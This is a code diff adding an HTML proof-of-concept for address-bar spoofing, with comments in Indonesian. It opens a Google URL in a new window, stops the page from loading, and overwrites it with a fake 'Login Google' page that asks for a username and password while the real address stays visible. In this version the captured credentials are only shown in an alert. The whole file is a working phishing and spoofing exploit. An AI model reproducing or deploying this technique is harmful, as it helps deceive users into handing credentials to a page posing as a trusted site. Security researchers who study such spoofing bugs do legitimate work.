@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <button onclick="spoof()">Click to spoof</button>
+
+    <script>
+      function spoof() {
+        let w = window.open("https://www.google.com/csi", "_blank");
+
+        setTimeout(() => {
+          try {
+            w.stop();
+            w.document.open();
+            w.document.write(`
+              <h1>Login Google</h1>
+              <button onclick="
+                let username = prompt('Masukkan username');
+                let password = prompt('Masukkan password');
+                alert('Username: ' + username + '\\nPassword: ' + password);
+              ">Login</button>
+            `);
+            w.document.close();
+          } catch (e) {
+            console.error("Tidak bisa injeksi:", e);
+          }
+        }, 500); // tunggu 0.5 detik biar address bar tetap
+      }
+    </script>
+  </body>
+</html>
